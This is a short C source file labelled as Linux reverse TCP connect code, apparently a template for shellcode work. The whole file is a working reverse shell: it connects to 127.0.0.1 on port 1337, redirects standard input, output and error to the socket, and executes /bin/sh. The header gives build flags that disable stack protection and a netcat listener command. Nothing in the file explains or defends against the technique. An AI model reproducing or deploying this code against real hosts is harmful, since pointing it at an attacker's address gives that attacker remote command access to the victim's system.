//Linux reverse TCP connect code

/*
* Author:           FXC
* Build/Run:        gcc -masm=intel -z execstack -fno-stack-protector reverse_shell.c -o reverse_shell
*                   nc -lvnp 1337
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>


int main(void)
{
	int sockfd;
	socklen_t socklen;

	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(1337);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", NULL, NULL);
}

